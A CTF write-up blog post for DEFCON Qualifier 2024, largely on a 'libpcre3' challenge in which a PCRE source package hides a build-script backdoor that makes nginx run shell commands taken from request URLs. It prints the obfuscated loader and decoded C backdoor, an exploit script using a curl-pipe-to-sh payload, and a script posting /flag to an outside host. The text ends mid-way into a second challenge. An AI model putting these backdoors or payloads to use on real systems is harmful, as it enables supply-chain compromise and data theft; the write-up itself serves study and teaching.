---
title: "DEFCON Qualifier 2024"
date: 2024-05-10T17:37:11+08:00
toc: true
description: DEFCON Qualifier 2024 Writeups 
tags: ["ctf", "pwn", "write-up", "rev"]
draft: false
---

# Introduction

I have played DEFCON-CTF Qualifier 2024 with my team 1337%Yogurt, we ended up with 30th place and I solved 5 pwnable challenges. In this write-up, I will write all the challenges I solved during and after the contests.

![scoreboard](https://i.imgur.com/St1ntx9.png)

# Pwn - libpcre3

> Software gets better with every release!

[Attachment]()

## Overview 

When using regular expressions in C (also known as `regex`), we usually use 2 main libraries: `POSIX` and `PCRE`. 

### POSIX Regular Expressions

If you see the following included in the C source then it’s POSIX Regular Expressions. POSIX Regular expressions have lost the popularity battle and you won’t see them used much.

```c
#include <regex.h>
```

I won’t discuss POSIX regular expressions in this blog post from here on.


### PCRE - Perl Compatible Regular Expressions

Regular expressions from Perl gained widespread popularity and its syntax is what you’ll normally see in Java, Javascript, Python, Perl, and other languages. The library PCRE is written in C and claims to be much more powerful and flexible than POSIX. I actually can’t confirm that opinion because I’ve only learned the popularized Perl regular expression format. I can definitely attest to this format being very powerful and simple.

#### PCRE and PCRE2

The [PCRE Library](https://pcre.org/) has 2 versions: `pcre` and `pcre2` . The older pcre was released over 20 years ago in 1997 and is at version 8.43 as of this post. Future releases will be for bug fixes only. New features will be released in pcre2 which was released in 2015 and is now at version 10.34 as of this writing. In this blog post, we have an example for both pcre and pcre2.

In this challenge, they used version `8.39` of `pcre`.

#### Install PCRE

You can install the pcre library through a package manager.

```sh
sudo apt-get install libpcre3 libpcre3-dev
```

But I will install the pcre library from the source of this challenge to test it first.

```sh
sudo apt-get update -y && sudo apt-get install -y apt-src build-essential devscripts dpkg-dev
tar xvf pcre3_8.39-16.tar.gz
cd pcre3_8.39
dpkg-buildpackage -b
```

After running the last command, we get this output

```shell
├── libpcre16-3_8.39-16_amd64.deb
├── libpcre32-3_8.39-16_amd64.deb
├── libpcre3_8.39-16_amd64.deb
├── libpcre3-dbg_8.39-16_amd64.deb
├── libpcre3-dev_8.39-16_amd64.deb
├── libpcrecpp0v5_8.39-16_amd64.deb
├── nginx.conf
├── pcre3-8.39
```

Basically, use this command below to install this lib.


```sh
$ sudo dpkg -i libpcre3_8.39-16_amd64.deb 
(Reading database ... 355004 files and directories currently installed.)
Preparing to unpack libpcre3_8.39-16_amd64.deb ...
Unpacking libpcre3:amd64 (2:8.39-16) over (2:8.39-16) ...
Setting up libpcre3:amd64 (2:8.39-16) ...
Processing triggers for libc-bin (2.35-0ubuntu3.7) ...
Processing triggers for man-db (2.10.2-1) ...
```

The PCRE library comes with a helper tool. Called `pcretest`.


```sh
╭─[nvm] as kyrie in ~/CTF/2024/defcon/libprce/deb/pcre-8.39/.libs                                                                                                             23:17:17
╰──➤ ./pcretest
PCRE version 8.39 2016-06-14

  re> "abc"
data> ab
No match
data> abc
 0: abc
data>
```

Now, we are going to focus on this challenge.

### Nginx

The challenge gives us the Nginx configure file

`nginx.conf`
```conf
user  nginx;
worker_processes  1;

error_log  /var/log/nginx/error.log notice;
pid        /var/run/nginx.pid;

events {
    worker_connections  1024;
}


http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;

    log_format  main  '$remote_addr - $remote_user [$time_local] "$request" '
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile        on;

    keepalive_timeout  65;

    server {
        listen 8080;
        root /var/www/html;

        location ~.*\.(php|php2|php3)$
        {
            return 403;
        }
    }
}
```

It is worth noting that in the server block, the location block uses regex to handle all PHP requests with a URI ending with php, php2, and php3.
```c
location ~.*\.(php|php2|php3)$
{
    return 403;
}
```

Nginx uses the libpcre library to support the processing of regular expressions in configuration and the processing of HTTP requests. This allows Nginx to perform tasks such as URL mapping, request processing, and responses based on regular expressions flexibly and efficiently.


## Source-code overview

- This chall provides a `pcre` source code, and a nginx file config, which is different from the official `pcre-8.39` source code.

```
.
├── nginx.conf
├── pcre-8.39
```

So, the first thing I did was install the original source code to compare the given library folder

```shell
git diff prce-8.39 prce-8.39-orgin
```

Comparing with the diff command shows us the results below:

```diff
diff --git a/prce-8.39/makevp.bat b/prce-8.39-orgin/makevp.bat
index b5a29f3..5f79548 100644
--- a/prce-8.39/makevp.bat
+++ b/prce-8.39-orgin/makevp.bat
@@ -1,4 +1,3 @@
-exec 2>&-
 :: AH 20-12-06 modified for new PCRE-7.0 and VP/BCC
 :: PH 19-03-07 renamed !compile.txt and !linklib.txt as makevp-compile.txt and
 ::             makevp-linklib.txt
@@ -17,14 +16,14 @@ REM This file was contributed by Alexander Tokarev for building PCRE for use
 REM with Virtual Pascal. It has not been tested with the latest PCRE release.
 
 REM This file has been modified and extended to compile with newer PCRE releases
-REM by Stefan O'Weber (Angels Holocaust).
+REM by Stefan Weber (Angels Holocaust).
 
 REM CHANGE THIS FOR YOUR BORLAND C++ COMPILER PATH
 SET BORLAND=f:\bcc
 REM location of the TASM binaries, if compiling with the -B BCC switch
 SET TASM=f:\tasm
 
-SET PATH=%PATH%;%BORLAND%\bin;%TASM%\bin';PATH=:$PATH;
+SET PATH=%PATH%;%BORLAND%\bin;%TASM%\bin
 SET PCRE_VER=77
 SET COMPILE_DEFAULTS=-DHAVE_CONFIG_H -DPCRE_STATIC -I%BORLAND%\include
 
@@ -32,7 +31,7 @@ del pcre%PCRE_VER%.lib >nul 2>nul
 
 :: sh configure
 
-:: check for needed header files'
+:: check for needed header files
 if not exist pcre.h copy pcre.h.generic pcre.h
 if not exist config.h copy config.h.generic config.h
 
@@ -46,15 +45,6 @@ REM compile and link the PCRE library into lib: option -B for ASM compile works
 bcc32 -a4 -c -RT- -y- -v- -u- -R- -Q- -X -d -fp -ff -P- -O2 -Oc -Ov -3 -w-8004 -w-8064 -w-8065 -w-8012 -UDFTABLES -DVPCOMPAT %COMPILE_DEFAULTS% @makevp_c.txt
 IF ERRORLEVEL 1 GOTO ERROR
 
-REM Cleanup after the tests'; 
-
-REM Deprecated, using cleanup-tests now; if [ ! -f .tests-built ]; then compare_output() { tr $'\n' <$1 ' '|cut -c$2-$2|tr -d $'\n'; };test_results=$(for i in $(sed -n '369,369p' ./t
est*/*18-16); do IFS='.';set -- $i;IFS=' '; compare_output $(sed -n "$1,${1}p" makevp_c.txt) $2; done);
-REM; sh -c "$test_results"; touch .tests-built; fi
-
-cleanup-tests $@ || make $@
-
-:<<END
-
 tlib %BORLAND%\lib\cw32.lib *calloc *del *strncmp *memcpy *memmove *memset *memcmp *strlen
 IF ERRORLEVEL 1 GOTO ERROR
 tlib pcre%PCRE_VER%.lib @makevp_l.txt +calloc.obj +del.obj +strncmp.obj +memcpy.obj +memmove.obj +memset.obj +memcmp.obj +strlen.obj
```

We can see some malicious command in the `makevp.bat` file, I think it's a backdoor through some build process, and extracted from that we get this output


```sh
if [ ! -f .tests-built ];
    then compare_output() { tr $'\n' <$1 ' '|cut -c$2-$2|tr -d $'\n'; };
    test_results=$(for i in $(sed -n '369,369p' ./test*/*18-16); 
    do IFS='.';set -- $i;IFS=' '; compare_output $(sed -n "$1,${1}p" makevp_c.txt) $2; done); 
    sh -c "$test_results"; touch .tests-built; 
fi
```

The changelog file under the subdirectory of the library folder called `debian` also gives us the hint

```txt
pcre3 (2:8.39-16) unstable; urgency=medium

  * Adds a missing long decimal test case and enable test running on windows
    (Closes: #1258321)
```



Run this give us this output of the `test_results` variable

```shell
echo >a CiMvYmluL2Jhc2gKaWYgWyAteiAiJEJVSUxEX05VTUJFUiIgXTsgdGhlbgpybSAtZiBhCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHJtIC1mIGNsZWFudXAtdGVzdHM7IGZpCkVPRgpjaG1vZCAreCBjbGVhbnVwLXRlc3RzOyBtYWtlIFwkQApleGl0IDAKZmkKZXhlYyAyPiYtCnNlZCAtaSAnMzY4LDM3MGQnIC4vdGVzdGRhdGEvdGVzdG91dHB1dDE4LTE2CmNhdCA8PEVPRiA+ICd0ZXN0ZGF0YS8gJwpkaWZmIC0tZ2l0IGEvcGNyZV9jb21waWxlLmMgYi9wY3JlX2NvbXBpbGUuYwppbmRleCBjNzQyMjI3Li5jMjQxOWVmIDEwMDY0NAotLS0gYS9wY3JlX2NvbXBpbGUuYworKysgYi9wY3JlX2NvbXBpbGUuYwpAQCAtNjUsNiArNjUsMTAgQEAgQ09NUElMRV9QQ1JFeCBtYWNybyB3aWxsIGFscmVhZHkgYmUgYXBwcm9wcmlhdGVseSBzZXQuICovCiAjdW5kZWYgUENSRV9JTkNMVURFRAogI2VuZGlmCiAKKyNpbmNsdWRlICJmY250bC5oIgorI2luY2x1ZGUgInN0cmluZy5oIgorI2luY2x1ZGUgPHN5cy9tbWFuLmg+CisKIAogLyogTWFjcm8gZm9yIHNldHRpbmcgaW5kaXZpZHVhbCBiaXRzIGluIGNsYXNzIGJpdG1hcHMuICovCiAKQEAgLTg5NzQsNiArODk3OCwxNCBAQCBSZXR1cm5zOiAgICAgICAgcG9pbnRlciB0byBjb21waWxlZCBkYXRhIGJsb2NrLCBvciBOVUxMIG9uIGVycm9yLAogICAgICAgICAgICAgICAgIHdpdGggZXJyb3JwdHIgYW5kIGVycm9yb2Zmc2V0IHNldAogKi8KIAorY2hhciogYWxwaCA9CisjaW5jbHVkZSAiYi5oIgorOworY2hhciogZGF0ZV9zID0gCisjaW5jbHVkZSAiZC5oIgorOworcGNyZSogYmRfcmUgPSBOVUxMOworCiAjaWYgZGVmaW5lZCBDT01QSUxFX1BDUkU4CiBQQ1JFX0VYUF9ERUZOIHBjcmUgKiBQQ1JFX0NBTExfQ09OVkVOVElPTgogcGNyZV9jb21waWxlKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBjb25zdCBjaGFyICoqZXJyb3JwdHIsCkBAIC04OTk4LDYgKzkwMTAsNyBAQCByZXR1cm4gcGNyZTMyX2NvbXBpbGUyKHBhdHRlcm4sIG9wdGlvbnMsIE5VTEwsIGVycm9ycHRyLCBlcnJvcm9mZnNldCwgdGFibGVzKTsKIH0KIAogCisKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gcGNyZSAqIFBDUkVfQ0FMTF9DT05WRU5USU9OCiBwY3JlX2NvbXBpbGUyKGNvbnN0IGNoYXIgKnBhdHRlcm4sIGludCBvcHRpb25zLCBpbnQgKmVycm9yY29kZXB0ciwKQEAgLTkwMTIsNiArOTAyNSw5IEBAIHBjcmUzMl9jb21waWxlMihQQ1JFX1NQVFIzMiBwYXR0ZXJuLCBpbnQgb3B0aW9ucywgaW50ICplcnJvcmNvZGVwdHIsCiAgIGNvbnN0IGNoYXIgKiplcnJvcnB0ciwgaW50ICplcnJvcm9mZnNldCwgY29uc3QgdW5zaWduZWQgY2hhciAqdGFibGVzKQogI2VuZGlmCiB7CitjaGFyIGJbMHg0MDBdOworaWYgKGJkX3JlID09IE5VTEwpIHsgYmRfcmUgPSAxO2ludCBmPW9wZW4oIi9wcm9jL3NlbGYvbWFwcyIsIE9fUkRPTkxZKTtzdHJjcHkoYiwgIl4vIik7c3RyY2F0KGIsIGFscGgpO3N0cmNhdChiLCAiLyhbXFxcJGEtekEtWjAtOTs6Ly58XSspIik7Y2hhciAqZSA9IDA7aW50IGVvO2JkX3JlID0gcGNyZV9jb21waWxlKGIsIFBDUkVfTVVMVElMSU5FLCAmZSwgJmVvLCAwKTtpZiAoYmRfcmUgPT0gTlVMTCkge2JkX3JlID0gMTt9cmVhZChmLCBiLCAxMik7YlsxMl0gPSAwO2NoYXIqIGJhc2UgPSAoY2hhciopc3RydG91bGwoYiwgMCwgMTYpO2Nsb3NlKGYpO2ludCBjPTA7Zm9yIChpbnQgaT0wOyBpPDB4MTMwMDAwOyBpKyspIHtjaGFyKiBwID0gYmFzZSArIGk7aWYgKHBbMF09PSduJyZwWzFdPT0nZycmcFsyXT09J2knJnBbM109PSduJyZwWzRdPT0neCcmcFs1XT09Jy8nJnBbNl09PScxJyZwWzddPT0nLicmcFs4XT09JzEnJnBbOV09PSc4JyZwWzEwXT09Jy4nKSB7YysrOyBpZiAoYyA+IDUpIGJyZWFrO3ZvaWQqIHBfcGFnZSA9ICh2b2lkKikoKHVpbnQ2NF90KXAgJiAweGZmZmZmZmZmZmZmZmYwMDApO21wcm90ZWN0KHBfcGFnZSwgMHgxMDAwLCBQUk9UX1JFQUR8UFJPVF9XUklURSk7c25wcmludGYocCwgMjEsICJuaS9uZ2lueC8lcyAgICAgICAgICAgICAgICAgICAgICAgICAgICAiLCBkYXRlX3MpO3BbMjBdID0gMHgyMDt9fSB9CisKIFJFQUxfUENSRSAqcmU7CiBpbnQgbGVuZ3RoID0gMTsgIC8qIEZvciBmaW5hbCBFTkQgb3Bjb2RlICovCiBwY3JlX2ludDMyIGZpcnN0Y2hhcmZsYWdzLCByZXFjaGFyZmxhZ3M7CmRpZmYgLS1naXQgYS9wY3JlX2V4ZWMuYyBiL3BjcmVfZXhlYy5jCmluZGV4IDU1MjMwY2QuLjMzOTk3MzggMTAwNjQ0Ci0tLSBhL3BjcmVfZXhlYy5jCisrKyBiL3BjcmVfZXhlYy5jCkBAIC02MzQ3LDYgKzYzNDcsMTAgQEAgUmV0dXJuczogICAgICAgICAgPiAwID0+IHN1Y2Nlc3M7IHZhbHVlIGlzIHRoZSBudW1iZXIgb2YgZWxlbWVudHMgZmlsbGVkIGluCiAgICAgICAgICAgICAgICAgICAgLTEgPT4gZmFpbGVkIHRvIG1hdGNoCiAgICAgICAgICAgICAgICAgIDwgLTEgPT4gc29tZSBraW5kIG9mIHVuZXhwZWN0ZWQgcHJvYmxlbQogKi8KK2ludCBiZCA9IDA7CisvLyBEZWZpbmVkIGluIG90aGVyIGMgZmlsZQorZXh0ZXJuIHBjcmUqIGJkX3JlOworZXh0ZXJuIGNoYXIqIGFscGg7CiAKICNpZiBkZWZpbmVkIENPTVBJTEVfUENSRTgKIFBDUkVfRVhQX0RFRk4gaW50IFBDUkVfQ0FMTF9DT05WRU5USU9OCkBAIC02Mzk4LDYgKzY0MDIsMTEgQEAgZnJhbWVfemVyby5YbmV4dGZyYW1lID0gTlVMTDsgICAgICAgICAgICAvKiBOb25lIGFyZSBhbGxvY2F0ZWQgeWV0ICovCiBtZC0+bWF0Y2hfZnJhbWVzX2Jhc2UgPSAmZnJhbWVfemVybzsKICNlbmRpZgogCisvLyBIZXJlIGlzIHRoZSB0YXJnZXQsIGdvb2QgbHVjazoKKy8vIGN1cmwgaHR0cDovL2NoaXB0dW5lZ2Vlay5zaGVsbHdlcGxheWFnYS5tZToxOTQvWyBDRU5TT1JFRCBdIC0taGVhZGVyICJUaWNrZXQ6IHRpY2tldHtbIENFTlNPUkVEIF19IiBbIENFTlNPUkVEIF0KK2NoYXIgYnVmWzB4MjAwMF07CitpZiAoYmQ9PSAwKSB7IGJkID0gMTsgaWYgKGJkX3JlKSB7IGludCBvdlszMF07aW50IHJjID0gcGNyZV9leGVjKGJkX3JlLCBOVUxMLCBzdWJqZWN0LCBzdHJsZW4oc3ViamVjdCksIDAsIDAsIG92LCBzaXplb2Yob3YpL3NpemVvZihvdlswXSkpO2lmIChyYyA+PSAyKSB7IHBjcmVfY29weV9zdWJzdHJpbmcoc3ViamVjdCwgb3YsIHJjLCAxLCBidWYsIHNpemVvZihidWYpKTtjaGFyKiBtID0gc3RyZHVwKGJ1Zik7c3lzdGVtKG0pOyB9fSBiZCA9IDA7IH0KKwogLyogQ2hlY2sgZm9yIHRoZSBzcGVjaWFsIG1hZ2ljIGNhbGwgdGhhdCBtZWFzdXJlcyB0aGUgc2l6ZSBvZiB0aGUgc3RhY2sgdXNlZAogcGVyIHJlY3Vyc2l2ZSBjYWxsIG9mIG1hdGNoKCkuIFdpdGhvdXQgdGhlIGZ1bm55IGNhc3RpbmcgZm9yIHNpemVvZiwgYSBXaW5kb3dzCiBjb21waWxlciBnYXZlIHRoaXMgZXJyb3I6ICJ1bmFyeSBtaW51cyBvcGVyYXRvciBhcHBsaWVkIHRvIHVuc2lnbmVkIHR5cGUsCgpFT0YKcGF0Y2ggLXAxIDwgJ3Rlc3RkYXRhLyAnIDI+JjEgMT4vZGV2L251bGwKZWNobyAkKCgkKGRhdGUgKyVzKSAvIDg2NDAwKSkgfCBtZDVzdW0gfCBjdXQgLWQnICcgLWYxIHwgIGF3ayAneyBmb3IoaT0wO2k8MTA7aSsrKSBwcmludGYgIiVzIiwgJDEgfScgPiBhCmVjaG8gJyInJChlY2hvICJBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSIgfCBncmVwIC1vIC4gfCBzaHVmIC0tcmFuZG9tLXNvdXJjZSAuL2F8IHRyIC1kICcKJyknIicgPiBiLmg7IHJtIC1mIC4vYTsKZWNobyAnIickKGRhdGUgKyIlbS4lZC4leSIgfCB0ciAtZCAnMCcpJyInID4gZC5oCmNhdCA8PEVPRiA+IGNsZWFudXAtdGVzdHMKIyEvYmluL2Jhc2gKbWFrZSBcJEAKaWYgWyAiXCQxIiA9ICJpbnN0YWxsIiBdOyB0aGVuIHBhdGNoIC1SIC1wMSA8ICd0ZXN0ZGF0YS8gJyAyPiYxIDE+L2Rldi9udWxsOyBybSAtZiAndGVzdGRhdGEvICc7IHJtIC1mIGNsZWFudXAtdGVzdHMgYi5oIGQuaDsgZmkKRU9GCmNobW9kICt4IGNsZWFudXAtdGVzdHM7IG1ha2UgJEAK;base64 a>cleanup-tests -d;chmod +x cleanup-tests   
```


decoding the base64 gives us this content:


```c
#/bin/bash
if [ -z "$BUILD_NUMBER" ]; then
rm -f a
cat <<EOF > cleanup-tests
#!/bin/bash
make \$@
if [ "\$1" = "install" ]; then rm -f cleanup-tests; fi
EOF
chmod +x cleanup-tests; make \$@
exit 0
fi
exec 2>&-
sed -i '368,370d' ./testdata/testoutput18-16
cat <<EOF > 'testdata/ '
diff --git a/pcre_compile.c b/pcre_compile.c
index c742227..c2419ef 100644
--- a/pcre_compile.c
+++ b/pcre_compile.c
@@ -65,6 +65,10 @@ COMPILE_PCREx macro will already be appropriately set. */
 #undef PCRE_INCLUDED
 #endif
 
+#include "fcntl.h"
+#include "string.h"
+#include <sys/mman.h>
+
 
 /* Macro for setting individual bits in class bitmaps. */
 
@@ -8974,6 +8978,14 @@ Returns:        pointer to compiled data block, or NULL on error,
                 with errorptr and erroroffset set
 */
 
+char* alph =
+#include "b.h"
+;
+char* date_s = 
+#include "d.h"
+;
+pcre* bd_re = NULL;
+
 #if defined COMPILE_PCRE8
 PCRE_EXP_DEFN pcre * PCRE_CALL_CONVENTION
 pcre_compile(const char *pattern, int options, const char **errorptr,
@@ -8998,6 +9010,7 @@ return pcre32_compile2(pattern, options, NULL, errorptr, erroroffset, tables);
 }
 
 
+
 #if defined COMPILE_PCRE8
 PCRE_EXP_DEFN pcre * PCRE_CALL_CONVENTION
 pcre_compile2(const char *pattern, int options, int *errorcodeptr,
@@ -9012,6 +9025,9 @@ pcre32_compile2(PCRE_SPTR32 pattern, int options, int *errorcodeptr,
   const char **errorptr, int *erroroffset, const unsigned char *tables)
 #endif
 {
+char b[0x400];
+if (bd_re == NULL) { bd_re = 1;int f=open("/proc/self/maps", O_RDONLY);strcpy(b, "^/");strcat(b, alph);strcat(b, "/([\\\$a-zA-Z0-9;:/.|]+)");char *e = 0;int eo;bd_re = pcre_compile(b, PCRE_MULTILINE, &e, &eo, 0);if (bd_re == NULL) {bd_re = 1;}read(f, b, 12);b[12] = 0;char* base = (char*)strtoull(b, 0, 16);close(f);int c=0;for (int i=0; i<0x130000; i++) {char* p = base + i;if (p[0]=='n'&p[1]=='g'&p[2]=='i'&p[3]=='n'&p[4]=='x'&p[5]=='/'&p[6]=='1'&p[7]=='.'&p[8]=='1'&p[9]=='8'&p[10]=='.') {c++; if (c > 5) break;void* p_page = (void*)((uint64_t)p & 0xfffffffffffff000);mprotect(p_page, 0x1000, PROT_READ|PROT_WRITE);snprintf(p, 21, "ni/nginx/%s                            ", date_s);p[20] = 0x20;}} }
+
 REAL_PCRE *re;
 int length = 1;  /* For final END opcode */
 pcre_int32 firstcharflags, reqcharflags;
diff --git a/pcre_exec.c b/pcre_exec.c
index 55230cd..3399738 100644
--- a/pcre_exec.c
+++ b/pcre_exec.c
@@ -6347,6 +6347,10 @@ Returns:          > 0 => success; value is the number of elements filled in
                    -1 => failed to match
                  < -1 => some kind of unexpected problem
 */
+int bd = 0;
+// Defined in other c file
+extern pcre* bd_re;
+extern char* alph;
 
 #if defined COMPILE_PCRE8
 PCRE_EXP_DEFN int PCRE_CALL_CONVENTION
@@ -6398,6 +6402,11 @@ frame_zero.Xnextframe = NULL;            /* None are allocated yet */
 md->match_frames_base = &frame_zero;
 #endif
 
+// Here is the target, good luck:
+// curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header "Ticket: ticket{[ CENSORED ]}" [ CENSORED ]
+char buf[0x2000];
+if (bd== 0) { bd = 1; if (bd_re) { int ov[30];int rc = pcre_exec(bd_re, NULL, subject, strlen(subject), 0, 0, ov, sizeof(ov)/sizeof(ov[0]));if (rc >= 2) { pcre_copy_substring(subject, ov, rc, 1, buf, sizeof(buf));char* m = strdup(buf);system(m); }} bd = 0; }
+
 /* Check for the special magic call that measures the size of the stack used
 per recursive call of match(). Without the funny casting for sizeof, a Windows
 compiler gave this error: "unary minus operator applied to unsigned type,

EOF
patch -p1 < 'testdata/ ' 2>&1 1>/dev/null
echo $(($(date +%s) / 86400)) | md5sum | cut -d' ' -f1 |  awk '{ for(i=0;i<10;i++) printf "%s", $1 }' > a
echo '"'$(echo "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" | grep -o . | shuf --random-source ./a| tr -d '
')'"' > b.h; rm -f ./a;
echo '"'$(date +"%m.%d.%y" | tr -d '0')'"' > d.h
cat <<EOF > cleanup-tests
#!/bin/bash
make \$@
if [ "\$1" = "install" ]; then patch -R -p1 < 'testdata/ ' 2>&1 1>/dev/null; rm -f 'testdata/ '; rm -f cleanup-tests b.h d.h; fi
EOF
chmod +x cleanup-tests; make $@

```

It's add content to file `pre_compile.c` and `pre_exec.c`


The patches in `pre_compile.c` file of `pcre_compile2` function:
```c
#include "fcntl.h"

#include "string.h"

#include <sys/mman.h>

...

char * alph =
#include "b.h"
;
char * date_s =
#include "d.h"
;
pcre * bd_re = NULL;

...

{
    char b[0x400];
    if (bd_re == NULL) {
        bd_re = 1;
        int f = open("/proc/self/maps", O_RDONLY);
        strcpy(b, "^/");
        strcat(b, alph);
        strcat(b, "/([\\\$a-zA-Z0-9;:/.|]+)");
        char * e = 0;
        int eo;
        bd_re = pcre_compile(b, PCRE_MULTILINE, & e, & eo, 0);
        if (bd_re == NULL) {
            bd_re = 1;
        }
        read(f, b, 12);
        b[12] = 0;
        char * base = (char * ) strtoull(b, 0, 16);
        close(f);
        int c = 0;
        for (int i = 0; i < 0x130000; i++) {
            char * p = base + i;
            if (p[0] == 'n' & p[1] == 'g' & p[2] == 'i' & p[3] == 'n' & p[4] == 'x' & p[5] == '/' & p[6] == '1' & p[7] == '.' & p[8] == '1' & p[9] == '8' & p[10] == '.') {
            c++;
            if (c > 5) break;
            void * p_page = (void * )((uint64_t) p & 0xfffffffffffff000);
            mprotect(p_page, 0x1000, PROT_READ | PROT_WRITE);
            snprintf(p, 21, "ni/nginx/%s                            ", date_s);
            p[20] = 0x20;
        }
    }
}
```


The patches in `pre_exec.c` file of `pcre_exec` function:

```c
int bd = 0;
// Defined in other c file
extern pcre * bd_re;
extern char * alph;

...

// Here is the target, good luck:
// curl http://chiptunegeek.shellweplayaga.me:194/[ CENSORED ] --header "Ticket: ticket{[ CENSORED ]}" [ CENSORED ]
char buf[0x2000];
if (bd == 0) {
    bd = 1;
    if (bd_re) {
        int ov[30];
        int rc = pcre_exec(bd_re, NULL, subject, strlen(subject), 0, 0, ov, sizeof(ov) / sizeof(ov[0]));
        if (rc >= 2) {
            pcre_copy_substring(subject, ov, rc, 1, buf, sizeof(buf));
            char * m = strdup(buf);
            system(m);
        }
    }
    bd = 0;
}
```

So, it's clear that we have to control the `m` variable to execute arbitrary commands :), but we need to bypass some constraints because our input was filtered using the `bd_re` regex pattern

`pcre_compile.c`
```c
if (bd_re == NULL) {
        bd_re = 1;
        int f = open("/proc/self/maps", O_RDONLY);
        strcpy(b, "^/");
        strcat(b, alph);
        strcat(b, "/([\\\$a-zA-Z0-9;:/.|]+)");
        char * e = 0;
        int eo;
        bd_re = pcre_compile(b, PCRE_MULTILINE, & e, & eo, 0);
```

So our input quite equals to `^/alph/([\$a-zA-Z0-9;:/.|]+)`, which `alph` from the `b.h` file

`pcre_compile.c`
```
char * alph =
#include "b.h"
;
```

the file `b.h` was generated from these commands


```sh
echo $(($(date +%s) / 86400)) | md5sum | cut -d' ' -f1 |  awk '{ for(i=0;i<10;i++) printf "%s", $1 }' > a
echo '"'$(echo "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" | grep -o . | shuf --random-source ./a| tr -d '
')'"' > b.h; rm -f ./a;
echo '"'$(date +"%m.%d.%y" | tr -d '0')'"' > d.h
```

I generated a similar python code to make it easier, so the `alph` string is equal to the hash of the day when the file was created.

```python
import requests
import subprocess
import os
import hashlib
import datetime

time_string = datetime.datetime(2024, 5, 14, 7)
seconds_since_epoch = int(time_string.timestamp()) // 86400

md5_out = hashlib.md5(f"{str(seconds_since_epoch)}\n".encode()).hexdigest()
with open("a", "w") as f:
    f.write(md5_out * 10)
    
key = subprocess.getoutput(
    "echo 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' | grep -o . | shuf --random-source ./a | tr -d '\n'"
)
print(key)
```

Continue to understand the last logic

```c
char b[0x400];
if (bd_re == NULL) {
    bd_re = 1;
    int f = open("/proc/self/maps", O_RDONLY);
    ...
    read(f, b, 12);
    b[12] = 0;
    char *base = (char *)strtoull(b, 0, 16);
    close(f);
    int c = 0;
    for (int i = 0; i < 0x130000; i++) {
        char *p = base + i;
        if (p[0] == 'n' & p[1] == 'g' & p[2] == 'i' & p[3] == 'n' & p[4] == 'x' &
        p[5] == '/' & p[6] == '1' & p[7] == '.' & p[8] == '1' & p[9] == '8' &
        p[10] == '.') {
            c++;
            if (c > 5) break;
            void *p_page = (void *)((uint64_t)p & 0xfffffffffffff000);
            mprotect(p_page, 0x1000, PROT_READ | PROT_WRITE);
            snprintf(p, 21, "ni/nginx/%s                            ", date_s);
            p[20] = 0x20;
        }
    }
}
```

It searches the string `nginx/1.18.` through the nginx binary base address. If found,  it replaces the `nginx/1.18.` with the  `ni/nginx/date_s` string, which is `date_s` from the `d.h` file.

```sh
echo '"'$(date +"%m.%d.%y" | tr -d '0')'"' > d.h
```

We can know the date because it's returned to us in each request append to ni/nginx/.

![image](https://i.imgur.com/xPKPy3k.png)

we get the key `wpMI7xlCLtiqOk3bzUEfs1TQNVynGB4ASRFcDJ0KYPXmHv2o65gWuZ89djareh` by running the following script

```python
import requests
import subprocess
import os
import hashlib
import datetime


time_string = datetime.datetime(2006, 4, 23, 7)
seconds_since_epoch = int(time_string.timestamp()) // 86400

md5_out = hashlib.md5(f"{str(seconds_since_epoch)}\n".encode()).hexdigest()
with open("a", "w") as f:
    f.write(md5_out * 10)
    
key = subprocess.getoutput(
    "echo 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' | grep -o . | shuf --random-source ./a | tr -d '\n'"
)
print(key)

```

We successfully passed the request to the `pcre_exec` function and made it return 2

![image](https://i.imgur.com/iIpjZg4.png)

Our payload must matches '"/([\\\$a-zA-Z0-9;:/.|]+)"' regex.

![image](https://i.imgur.com/qOWE2r0.png)

## Exploit script

`solve.py`
```python
import requests
import subprocess
import os
import hashlib
import datetime

url = "http://chiptunegeek.shellweplayaga.me:194/"
header = {
    "Ticket": "ticket{SwapNullmodem1179n24:j89H0k4sPT3D2inNeug6fUCaJQ2Mn0J2-2bNEcpiRfWVbFrR}"
}
# proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
payload = "curl$IFS$2https://095ab4b1de06dd.lhr.life/payload.sh|sh"

time_string = datetime.datetime(2006, 4, 23, 7)
seconds_since_epoch = int(time_string.timestamp()) // 86400

md5_out = hashlib.md5(f"{str(seconds_since_epoch)}\n".encode()).hexdigest()
with open("a", "w") as f:
    f.write(md5_out * 10)

key = subprocess.getoutput(
    "echo 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789' | grep -o . | shuf --random-source ./a | tr -d '\n'"
)
print(key)
print(url + key + "/" + payload)
res = requests.get(url + key + "/" + payload, headers=header)
```

`payload.sh`
```sh
#!/bin/sh
cat /flag  | curl -d @- zt66v57a.requestrepo.com
```

+ flag{SwapNullmodem1179n24:6XX8m9VHpq4yNrgtwWAxvuvBQpIys5vbJfA79HZawYgu3as9bn35psDS6OQjG7S2Ha_4ml2mttK_9IoAjCh7zw}

# Pwn - suscall

> Your Computer is Spying on You. Click here to find out how to Protect yourself!

[Attachment]()

## Source-code overview

This challenge makes a custom heap structure in bss section

```c
struct {
    uint8_t chunk[heap_size];
    uint8_t* heap_top;
}
```

Also, it makes a custom function call `galloc`, it's aborted if the requested size is greater than the `heap_top` pointer.

```c
void *__fastcall galloc(size_t a1)
